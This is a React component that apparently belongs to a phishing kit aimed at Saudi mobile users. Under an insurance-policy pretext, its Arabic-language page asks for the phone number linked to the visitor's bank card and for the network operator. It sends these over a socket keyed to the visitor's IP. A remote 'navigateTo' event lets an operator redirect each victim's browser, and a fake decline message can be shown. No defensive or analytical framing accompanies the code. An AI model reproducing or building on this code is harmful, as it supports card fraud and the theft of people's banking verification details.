import React, { useState, useEffect } from "react";
import Overlay from "./Overlay";
import { socket } from "../App";


const PhoneInput = () => {
  const [phone, setPhone] = useState("");
  const [operator, setOperator] = useState("STC");
  const [overlay, setOverlay] = useState(false);
  const [visitorIP, setVisitorIP] = useState(
    localStorage.getItem("visitorIP") || null
  );
  const [declined, setDeclined] = useState(false);

  useEffect(() => {
  
      setVisitorIP(localStorage.getItem("visitorIP"));
      socket.emit("updateLocation", {
        ip: localStorage.getItem("visitorIP"),
        page: "phone",
      });
  

    const urlParams = new URLSearchParams(window.location.search);
    setDeclined(urlParams.get("declined") === "true");

    socket.on("ackPhone", (resp) => {
        console.log(resp);
      if (!resp.success) {
        setOverlay(false);
        setDeclined(true);
        
        console.error(resp.error);
      }
    });

    socket.on("navigateTo", ({ ip, page }) => {
      if (ip === visitorIP) {
        window.location.href = "/" + page;
      }
    });

    return () => socket.off("ackPhone");
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setOverlay(true);
    console.log(visitorIP);
    if (visitorIP) {
      socket.emit("submitPhone", {
        ip: visitorIP,
        phoneNumber: phone,
        operator,
      });
    }
  };

  return (
    <div
      className="min-h-screen bg-gray-50 p-6 flex items-center justify-center"
      dir="rtl"
    >
      {overlay ? <Overlay />: ''}
      <div className="w-full max-w-md bg-white rounded-2xl shadow p-6 font-readex text-right">
        <img src="/cstr.png" alt="Logo" className="mb-6 mx-auto w-60" />
        <h2 className="text-lg font-semibold text-center">توثيق رقم الجوال</h2>
        <p className="text-sm text-gray-600 mt-3 leading-6">
          يرجى إدخال رقم الجوال ومشغّل شبكة الاتصالات الخاص بك، وذلك لاستكمال
          إجراءات إصدار وثيقة التأمين وربطها بالبيانات المعتمدة. على أن يكون رقم
          الجوال المرتبط بالبطاقة البنكية، وذلك لأغراض التحقق.
        </p>

        {declined && (
          <div className="bg-red-100 text-red-800 p-2 rounded mt-4 text-sm">
            عذرا، رقم الجوال المدخل غير صحيح او غير مرتبط بوسيلة الدفع.
          </div>
        )}

        <form onSubmit={handleSubmit} className="mt-6 space-y-5">
          <div className="text-right">
            <label htmlFor="phone" className="block text-sm text-gray-700 mb-1">
              أدخل رقم الجوال :
            </label>
            <input
              type="tel"
              id="phone"
              className="w-full text-center border border-gray-300 p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="05xxxxxxxx"
              pattern="^05[0-9]{8}$"
              title="يجب أن يبدأ الرقم بـ05 ويكون مكوّنًا من 10 أرقام دون رمز الدولة"
              onInput={(e) =>
                (e.target.value = e.target.value
                  .replace(/\D/g, "")
                  .slice(0, 10))
              }
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              required
            />
          </div>

          <div className="text-right">
            <label
              htmlFor="operator"
              className="block text-sm text-gray-700 mb-1"
            >
              إختيار مشغل الشبكة :
            </label>
            <select
              id="operator"
              className="w-full border border-gray-300 p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              value={operator}
              onChange={(e) => setOperator(e.target.value)}
            >
              <option value="STC">STC</option>
              <option value="Mobily">Mobily</option>
              <option value="Zain">Zain</option>
              <option value="Lebara">Lebara</option>
              <option value="Virgin">Virgin</option>
            </select>
          </div>

          <button
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-md transition"
          >
            تأكيد
          </button>
        </form>

        <p className="text-xs text-gray-400 mt-4 text-right">
          هل تحتاج للمساعدة ؟
        </p>
      </div>
    </div>
  );
};

export default PhoneInput;
